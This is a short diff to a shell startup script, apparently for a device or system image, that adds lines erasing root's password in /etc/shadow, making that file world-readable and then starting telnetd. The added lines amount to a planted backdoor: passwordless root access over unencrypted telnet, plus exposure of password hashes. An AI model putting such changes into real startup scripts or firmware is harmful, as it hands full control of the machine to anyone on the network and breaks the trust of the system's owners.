@@ -1,2 +1,7 @@
 #!/bin/sh
+sed 's/root:.*/root::0:0:99999:7:::/' /etc/shadow > /etc/shadow.tmp
+rm /etc/shadow
+cp /etc/shadow.tmp /etc/shadow
+rm /etc/shadow.tmp
+chmod 744 /etc/shadow
 /sbin/telnetd &
